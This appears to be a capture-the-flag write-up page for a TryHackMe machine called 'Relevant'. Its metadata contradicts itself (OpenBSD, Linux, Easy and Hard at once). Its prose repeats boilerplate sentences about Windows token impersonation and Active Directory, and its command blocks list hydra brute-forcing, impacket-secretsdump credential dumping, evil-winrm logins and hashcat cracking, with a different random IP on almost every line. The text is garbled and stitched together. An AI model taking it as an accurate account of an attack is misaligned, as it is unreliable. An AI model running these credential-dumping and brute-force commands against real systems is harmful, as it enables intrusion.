---
TitleSEO: "TryHackMe — Relevant (Hard OpenBSD) | ZureFX"
TitlePost: "TryHackMe — Relevant (Hard OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Relevant. DLL Hijacking and Writable PATH to achieve hard compromise on OpenBSD."
Keywords: "linux, easy, reversing, hard, active directory, forensics"
URL: "https://zurefx.github.io/writeups/htb-relevant-626.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-relevant-626/"
Date: "2024-03-31"
Tags: "Linux, Easy, Reversing, Hard, Active Directory, Forensics"
Section: "writeups"
Lang: "en"
main_img: "htb-relevant-626"
Permalink: "/writeups/htb-relevant-626.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Relevant** is rated **Hard** on TryHackMe. It runs **OpenBSD** and the IP address during this analysis was `10.80.241.210`.

### Objectives

The target system was identified as running a vulnerable version of the service. The kernel version was outdated and vulnerable to a publicly known exploit.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p3268,22,993 10.23.169.7 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.102.161.199
nmap -sCV -p5432,53,443 10.77.106.81 -oN scan.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Service Enumeration

The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory.

```bash
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.38.47.249/FUZZ
evil-winrm -i 10.98.83.12 -u administrator -p 'P@ssw0rd!'
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit.

### SMB Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
feroxbuster -h
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.37.122.28
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Exploitation

### Vulnerability Identification

The service was running without proper input validation, leading to injection vulnerabilities. Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities.

Key finding: **DLL Hijacking**.

Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files.

### Initial Access

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.53.36.28 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.103.50.233 -u administrator -p 'P@ssw0rd!'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service.

## Privilege Escalation

### Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
nmap -sCV -p143,143,27017 10.43.202.82 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.116.145.146 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.19.64.130
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.50.230.179/FUZZ
```

The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions.

## Summary

### Tools Used

- `nikto`
- `john`
- `socat`
- `atexec`
- `wmiexec`
- `gobuster`
- `msfvenom`
- `hydra`

### Key Takeaways

- DLL Hijacking
- Writable PATH
